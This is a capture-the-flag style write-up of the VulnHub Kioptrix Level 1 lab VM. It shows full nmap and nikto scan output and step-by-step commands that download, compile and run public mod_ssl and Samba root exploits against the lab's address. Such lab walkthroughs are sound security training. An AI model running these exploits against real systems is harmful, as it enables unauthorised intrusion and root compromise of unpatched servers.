---
layout: default
---

# VulnHub - Kioptrix level 1 writeup 

![Kioptrix Level 1 Header](/assets/images/vh_kioptrix1/kioptrix1_header.png)

[VulnHub Image Link](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

:monocle_face: :clock11:

> This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

## Initial recon
### Nmap scan

We start initial active recon with an TCP SYN (-sS) version (-sV) fast (-T4) aggressive (-A) scan of all TCP ports (-p-) and output to all formats (-oA).
Very Verbose output (-vv) to see live scanning results
```
sudo nmap -sS -sV -A -T4 -vv -p- -oA syn_ver_agg_alltcp_ports 10.0.2.15
```

We can also run a quick version UDP scan (-sUV) of the top 1000 ports to see if there is any interesting UDP ports.
```
sudo nmap -sUV -T4 -vv 10.0.2.15 -oA udp_fast_scan
```

### Nmap results
#### TCP Scan

```
# Nmap 7.80 scan initiated Sun Jul 19 10:00:54 2020 as: nmap -sS -sV -A -T4 -vv -p- -oA syn_ver_agg_alltcp_ports 10.0.2.15
Nmap scan report for 10.0.2.15
Host is up, received arp-response (0.00075s latency).
Scanned at 2020-07-19 10:00:55 EDT for 133s
Not shown: 65529 closed ports
Reason: 65529 resets
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
| 1024 35 109482092953601530927446985143812377560925655194254170270380314520841776849335628258408994190413716152105684423280369467219093526740118507720167655934779634416983599247086840099503203800281526143567271862466057363705861760702664279290804439502645034586412570490614431533437479630834594344497670338190191879537
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAKtycvxuV/e7s2cN74HyTZXHXiBrwyiZe/PKT/inuT5NDSQTPsGiyJZU4gefPAsYKSw5wLe28TDlZWHAdXpNdwyn4QrFQBjwFR+8WbFiAZBoWlSfQPR2RQW8i32Y2P2V79p4mu742HtWBz0hTjkd9qL5j8KCUPDfY9hzDuViWy7PAAAAFQCY9bvq+5rs1OpY5/DGsGx0k6CqGwAAAIBVpBtIHbhvoQdN0WPe8d6OzTTFvdNRa8pWKzV1Hpw+e3qsC4LYHAy1NoeaqK8uJP9203MEkxrd2OoBJKn/8EXlKAco7vC1dr/QWae+NEkI1a38x0Ml545vHAGFaVUWkffHekjhR476Uq4N4qeLfFp5B+v+9flLxYVYsY/ymJKpNgAAAIEApyjrqjgX0AE4fSBFntGFWM3j5M3lc5jw/0qufXlHJu8sZG0FRf9wTI6HlJHHsIKHA7FZ33vGLq3TRmvZucJZ0l55fV2ASS9uvQRE+c8P6w72YCzgJN7v4hYXxnY4RiWvINjW/F6ApQEUJc742i6Fn54FEYAIy5goatGFMwpVq3Q=
|   1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAvv8UUWsrO7+VCG/rTWY72jElft4WXfXGWybh141E8XnWxMCu+R1qdocxhh+4Clz8wO9beuZzG1rjlAD+XHiR3j2P+sw6UODeyBkuP24a+7V8P5nu9ksKD1fA83RyelgSgRJNQgPfFU3gngNno1yN6ossqkcMQTI1CY5nF6iYePs=
|_sshv1: Server supports SSHv1
80/tcp    open  http        syn-ack ttl 64 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     syn-ack ttl 64 2 (RPC #100000)
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   syn-ack ttl 64 Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2020-07-19T18:02:09+00:00; +3h59m59s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
32768/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
MAC Address: 08:00:27:FC:34:DC (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/19%OT=22%CT=1%CU=30139%PV=Y%DS=1%DC=D%G=Y%M=080027%T

Uptime guess: 0.006 days (since Sun Jul 19 09:54:39 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=196 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: 3h59m58s
| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KIOPTRIX<00>         Flags: <unique><active>
|   KIOPTRIX<03>         Flags: <unique><active>
|   KIOPTRIX<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   MYGROUP<00>          Flags: <group><active>
|   MYGROUP<1d>          Flags: <unique><active>
|   MYGROUP<1e>          Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58655/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 61973/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 49193/udp): CLEAN (Timeout)
|   Check 4 (port 33551/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.75 ms 10.0.2.15

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 19 10:03:08 2020 -- 1 IP address (1 host up) scanned in 134.83 seconds
```

There are a few interesting ports and servers that we can enumerate for vulnerabilities.
```
22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        syn-ack ttl 64 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     syn-ack ttl 64 2 (RPC #100000)
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   syn-ack ttl 64 Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
```


#### UDP Scan

```
# Nmap 7.80 scan initiated Sun Jul 19 10:10:53 2020 as: nmap -sUV -T4 -vv -oA udp_fast_scan 10.0.2.15
Nmap scan report for 10.0.2.15
Host is up, received arp-response (0.00092s latency).
Scanned at 2020-07-19 10:10:55 EDT for 1163s
Not shown: 982 closed ports
Reason: 982 port-unreaches
PORT      STATE         SERVICE         REASON              VERSION
111/udp   open          rpcbind         udp-response ttl 64 2 (RPC #100000)
137/udp   open          netbios-ns      udp-response ttl 64 Samba nmbd netbios-ns (workgroup: MYGROUP)
138/udp   open|filtered netbios-dgm     no-response
1000/udp  open|filtered ock             no-response
9200/udp  open|filtered wap-wsp         no-response
17018/udp open|filtered unknown         no-response
19181/udp open|filtered unknown         no-response
19789/udp open|filtered unknown         no-response
20449/udp open|filtered unknown         no-response
22996/udp open|filtered unknown         no-response
25280/udp open|filtered unknown         no-response
27899/udp open|filtered unknown         no-response
28641/udp open|filtered unknown         no-response
32768/udp open          status          udp-response        1 (RPC #100024)
32776/udp open|filtered sometimes-rpc16 no-response
34038/udp open|filtered unknown         no-response
34579/udp open|filtered unknown         no-response
48078/udp open|filtered unknown         no-response
MAC Address: 08:00:27:FC:34:DC (Oracle VirtualBox virtual NIC)
Service Info: Host: KIOPTRIX

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 19 10:30:18 2020 -- 1 IP address (1 host up) scanned in 1165.20 seconds
```

Nothing much of the ordinary for UDP ports, looks as expected with RPC and SMB ports open.

## Web Server enumeration (Ports 80 and 443)

Going to the web servers default directory reveals the standard Apache Web Page running on Red Hat Linux.

Lets do some enumeration web server using nikto and dirbuster.

The dirbuster scan did not reveal much. There was an mrtg (Multi Router Traffic Grapher) tool installed on the web server but it did not reveal much.

***http://10.0.2.15/mrtg/mrtg.html***

### Nikto scan

Run the following command and save the results to a file using tee if you wish.

```
nikto -h 10.0.2.15 | tee nikto_scan.txt
```

#### Nikto scan results

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.15
+ Target Hostname:    10.0.2.15
+ Target Port:        80
+ Start Time:         2020-07-20 15:49:56 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).
+ OSVDB-3268: /manual/: Directory indexing found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ /wp-content/themes/twentyeleven/assets/images/vh_kioptrix1/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-content/themes/twentyeleven/assets/images/vh_kioptrix1/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2020-07-20 15:50:41 (GMT-4) (45 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

It appears that the Apache Server is quite outdated and there seems to be quite a few attack vectors we can make use of.

Of particular interest is this remote buffer overflow that could lead to a shell? Lets investigate it further.
> + mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082

[CVE-2002-0082 Details](https://nvd.nist.gov/vuln/detail/CVE-2002-0082)
> The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.

Searching for mod_ssl on exploitdb.com reveals a few potential exploits.
The most promossing ones are
* [Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow](https://www.exploit-db.com/exploits/21671)
* [Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)](https://www.exploit-db.com/exploits/47080)

I tried to compile the first one but was met with compilation errors, I fixed a few but proceeded to get more errors.
I then found this exploit **OpenLuck** that was based off the orginal exploit but is fixed and works.

[OpenLuck Exploit GitHub](https://github.com/heltonWernik/OpenLuck)
 ```
# Download the source code
wget https://github.com/heltonWernik/OpenLuck/raw/master/OpenFuck.c

# install ssl-dev library dependancy
apt-get install libssl-dev

# Compile the exploit code
gcc -o OpenFuck OpenFuck.c -lcrypto

# Run the exploit and get a root shell.
./OpenFuck 0x6b 10.0.2.15 443 -c 40
```

The first parameter 0x6b represents the buffer overflow memory address offset value. You need to select which one matches the targets operating system.

In this case it is: **0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2**

The -c parameter is the number of open connections.

![OpenLuck Exploit](/assets/images/vh_kioptrix1/vh_kioptrix1_openluck_1.jpg)


## SMB Enumeration (Port 139)

The nmap scan did not reveal the samba version. There are a few ways to get this.
> 139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)

You can use the metasploit **auxiliary/scanner/smb/smb_version** module.

```
msfconsole
use auxiliary/scanner/smb/smb_version 
set RHOST <target ip>
run
```

![Metasploit SMB Version Scan](/assets/images/vh_kioptrix1/vh_kioptrix1_smb_msf1.jpg)

This tells us that its running **Unix (Samba 2.2.1a)**

What if you cant use metasploit for some reason?

A cooler way is to use ngrep and initate an null session connection using smbclient.

```
# -d is to specify the interface to listen on.
sudo ngrep -i -d eth1 's.?a.?m.?b.?a.*[[:digit:]]' port 139

# In another terminal open an SMB connection using smbclient and exit
echo exit | smbclient -L 10.0.2.15
```

![smbclient connection](/assets/images/vh_kioptrix1/vh_kioptrix1_smb_ngrep0.jpg)

You should be able to spot the samba smb verion as below.

![Ngrep Samba version](/assets/images/vh_kioptrix1/vh_kioptrix1_smb_ngrep1.jpg)

* Tip - If you running a fresh kail you might have to configure your samba configuration to be able to also use old SMB protocol versions.
```
sudo nano /etc/samba/smb.conf

#Insert the following lines under the [global] section.
client min protocol = CORE
client max protocol = SMB3

# Restart the SMB service
sudo systemctl restart smbd.service
````

The above tip will allow you to use smbclient and avoid this error. Enum4linux also works correctly when those settings are set.
> protocol negotiation failed: NT_STATUS_IO_TIMEOUT

```
enum4linux -a 10.0.2.15 | tee enum4linux_results.txt
```

Enum4linux did not reveal any interesting information thus the results are obmitted.

Ok so we now know the Samba verion (2.2.1.a) that is running on the target system.

If we check exploitdb.com we will find the following exploit which seems like it will affect our version also.

[Samba < 2.2.8 (Linux/BSD) - Remote Code Execution](https://www.exploit-db.com/exploits/10)

[CVE-2003-0201 Details](https://nvd.nist.gov/vuln/detail/CVE-2003-0201)

> Buffer overflow in the call_trans2open function in trans2.c for Samba 2.2.x before 2.2.8a, 2.0.10 and earlier 2.0.x versions, and Samba-TNG before 0.3.2, allows remote attackers to execute arbitrary code.

```
# Download the exploit code
wget https://www.exploit-db.com/download/10 -O sambal.c

# Compile the exploit
gcc -o sambal sambal.c

# Run the exploit and get a root shell
./sambal -b=0 -v 10.0.2.15
```

![Samba Exploit](/assets/images/vh_kioptrix1/vh_kioptrix1_samba_exploit.jpg)


## Summary

Well I found two easy ways to gain root on this machine. It did involve a bit of enumeration and research to find and get the correct exploits to work.

There was this tiny bit of loot in the /var/mail/root directory. Guess we can expect a slightly more challanging system on Kioptrix Level 2 :smile:

![Kioptrix 1 Loot](/assets/images/vh_kioptrix1/vh_kioptrix1_loot.jpg)

